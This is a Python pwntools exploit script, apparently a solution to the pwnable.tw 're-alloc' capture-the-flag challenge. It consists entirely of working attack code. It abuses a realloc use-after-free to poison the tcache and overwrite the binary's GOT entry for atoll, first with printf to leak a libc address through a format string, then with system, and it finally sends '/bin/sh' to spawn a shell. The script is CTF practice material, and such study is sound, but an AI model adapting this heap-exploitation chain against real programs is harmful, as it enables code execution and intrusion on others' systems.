#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x, drop = True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x,y: p.sendafter(x, y)

context.log_level = 'debug'
context.terminal = ['tmux','sp','-h','-l','120']

filename = "./re-alloc"
p = process(filename)
# p = remote("chall.pwnable.tw", 10106)
e = ELF(filename)
l = e.libc
# l = ELF("./libc.so")

def alloc(idx, size, data):
	ru(b"Your choice:")
	sl(b"1")
	ru(b"Index:")
	sl(str(idx).encode())
	ru(b"Size:")
	sl(str(size).encode())
	ru(b"Data:")
	s(data)
def realloc(idx, size, data):
	ru(b"Your choice:")
	sl(b"2")
	ru(b"Index:")
	sl(str(idx).encode())
	ru(b"Size:")
	sl(str(size).encode())
	if size:
		ru(b"Data:")
		s(data)
def free(idx):
	ru(b"Your choice:")
	sl(b"3")
	ru(b"Index:")
	sl(str(idx).encode())

alloc(0, 0x10, b"aaa")
realloc(0, 0x00, b"")
realloc(0, 0x10, p64(e.got["atoll"]))
alloc(1, 0x10, b"bbb")

realloc(0, 0x30, b"aaa")
free(0)
realloc(1, 0x30, b"a"*0x20)
free(1)

alloc(0, 0x20, b"aaa")
realloc(0, 0x00, b"")
realloc(0, 0x20, p64(e.got["atoll"]))
alloc(1, 0x20, b"bbb")

realloc(0, 0x40, b"aaa")
free(0)
realloc(1, 0x40, b"a"*0x40)
free(1)

alloc(0, 0x20, p64(e.plt['printf']))

ru(b"choice:")
sl(b"1")

ru(b"ex:")
sl(b"%15$11x")
ru(b"0")
leak_addr = u64(ru(b"Invalid !").strip().ljust(8, b"\x00")) - l.symbols["_IO_2_1_stdout_"]
print(hex(leak_addr))

ru(b"Your choice:")
sl(b"1")
ru(b"Index:")
s(b"a")
ru(b"Size:")
s(p64(leak_addr + l.symbols['system']))

ru(b"Data:")
s(p64(leak_addr + l.symbols['system']))
ru(b"Your choice:")
sl(b"1")
ru(b"Index:")
s(b"/bin/sh\x00")
# input()
# sl(b"cat /home/re-alloc/flag")

p.interactive()